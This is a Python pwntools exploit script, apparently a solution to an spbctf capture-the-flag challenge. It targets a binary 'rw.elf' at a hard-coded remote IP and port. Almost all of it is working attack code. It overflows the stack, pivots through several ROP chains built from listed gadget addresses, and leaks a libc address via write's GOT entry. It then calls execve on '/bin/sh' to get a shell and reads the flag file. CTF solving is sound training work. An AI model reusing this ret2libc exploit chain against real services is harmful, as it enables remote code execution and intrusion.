#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import re

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./rw.elf')

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11641)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

libc = ELF("libc.so.6_1ec728d58f7fc0d302119e9bb53050f8")
# libc = ELF("../my_libc.so")
write_got = exe.got['write']
write_plt = exe.plt['write']
read_got = exe.got['read']
read_plt = exe.plt['read']
# system_libc = libc.sym['system']
write_libc = libc.sym['write']
bin_sh_str = 0x1b75aa

# system_offset = write_got - system_got

ext_mem_addr = 0x404068
ext_mem_addr1 = 0x404068+64

main_addr = 0x40115B
POP_RDI = 0x40123b
RET  = 0x4010A0
POP_RSI_R15 = 0x401239
POP_RSI = 0x401156
POP_RSP = 0x401154
POP_RDX = 0x401152
csu_start_addr = 0x401218
csu_start_addr_without_mov_edi = 0x401221
csu_end_addr = 0x401232

one_gadget = 0xe6e79


# how to leak libc:
#   pl += csu(0, 1, 1, write_got, 8, write_got)
io.recvuntil("Hi")
# ROP 1
pl = cyclic(24)
pl += p64(POP_RSI)
pl += p64(ext_mem_addr)
pl += p64(read_plt)
pl += p64(POP_RSP)
pl += p64(ext_mem_addr)


payload_len = len(pl)
# log.info(f"ROP1 len = {payload_len}")
io.send(pl.ljust(64, b"\x00"))

ext_mem_addr += payload_len

# ROP 2

pl = p64(POP_RSI)
pl += p64(ext_mem_addr)
pl += p64(POP_RDX)
pl += p64(144)
pl += p64(read_plt)
pl += p64(POP_RSP)
pl += p64(ext_mem_addr)

payload_len = len(pl)
# log.info(f"ROP2 len = {payload_len}")
io.send(pl.ljust(64, b"\x00"))
ext_mem_addr += payload_len

#ROP 3

pl = p64(RET)
# pl += p64(csu_end_addr) + p64(0) + p64(1) + p64(1) + p64(write_got) + p64(8) + p64(write_got)
# pl += p64(csu_start_addr) + p64(0) + p64(0) + p64(1) + p64(0) + p64(0) + p64(0) + p64(write_got)
pl += p64(POP_RDX)
pl += p64(8)
pl += p64(POP_RSI)
pl += p64(write_got)
pl += p64(POP_RDI)
pl += p64(1)
pl += p64(write_plt)
pl += p64(POP_RDI)
pl += p64(0)
pl += p64(POP_RSI)
pl += p64(ext_mem_addr1)
pl += p64(POP_RDX)
pl += p64(64)
pl += p64(read_plt)
pl += p64(POP_RSP)
pl += p64(ext_mem_addr1)
# log.info(f"ROP3 len = {len(pl)}")
io.sendline(pl.ljust(143, b"\x00"))


write_libc_leak = u64(io.recv()[0:8])
LIBC_base = write_libc_leak - write_libc
libc.address = LIBC_base
log.info(f"LIBC_base: {hex(LIBC_base)}")

#ROP 4

pl = p64(RET)
pl += p64(POP_RSI)
pl += p64(0)
pl += p64(POP_RDX)
pl += p64(0)
pl += p64(POP_RDI)
pl += p64(LIBC_base + bin_sh_str)
pl += p64(libc.sym["execve"])

io.sendline(pl.ljust(63, b"\x00"))


io.sendline("cat flag")
io.recvuntil("spbctf")
flag = io.recvuntil("}").decode()
log.success(f"Flag: spbctf{flag}")

# io.interactive()

io.close()

